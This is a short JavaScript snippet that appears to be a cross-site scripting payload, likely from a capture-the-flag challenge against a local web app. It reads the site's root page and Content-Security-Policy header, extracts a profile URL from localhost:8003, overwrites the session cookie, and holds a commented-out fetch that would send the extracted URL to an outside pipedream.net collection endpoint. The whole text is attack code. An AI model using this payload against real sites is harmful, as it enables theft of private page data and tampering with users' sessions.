xhr = new XMLHttpRequest();
xhr.open("GET", "/", false)
xhr.onload = function () {
    console.log(`Loaded: ${xhr.status}\n${xhr.getResponseHeader("Content-Security-Policy")}\n${xhr.response}`);
    let url = /"http:\/\/localhost:8003\/profile\/.*"/.exec(xhr.response);
    console.log(url[0]);
    document.cookie="session=''"
    // fetch("https://eoor1c6mm76wo38.m.pipedream.net/" + url[0]);
};
xhr.send(null)
